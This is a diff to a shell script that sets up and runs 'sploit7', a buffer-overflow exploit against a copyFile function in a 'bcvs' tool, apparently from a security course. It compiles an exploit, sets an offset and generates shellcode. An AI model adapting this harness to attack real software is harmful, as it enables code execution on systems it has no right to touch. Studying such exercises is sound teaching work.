@@ -13,8 +13,16 @@
 # overflow in the copyFile function.
 ## ----------------------------------------------------- ##
 
-EXPLOIT_EXE="../exploit"
+EXPLOIT_EXE="./exploit"
 SPLOIT_DIR="sploit7_dir"
+
+
+rm -rf $SPLIOT_DIR
+mkdir -p $SPLOIT_DIR
+cd $SPLOIT_DIR
+mkdir -p .bcvs
+touch .bcvs/block.list
+
 
 cat <<EOS > "exploit.c"
 #include <stdlib.h>
@@ -89,13 +97,6 @@ EOS
 gcc -o exploit exploit.c
 
 OFFSET=1139
-
-rm -rf $SPLIOT_DIR
-mkdir -p $SPLOIT_DIR
-cd $SPLOIT_DIR
-mkdir -p .bcvs
-touch .bcvs/block.list
-
 
 SHELL_CODE=$($EXPLOIT_EXE)
 #echo "$SHELL_CODE"
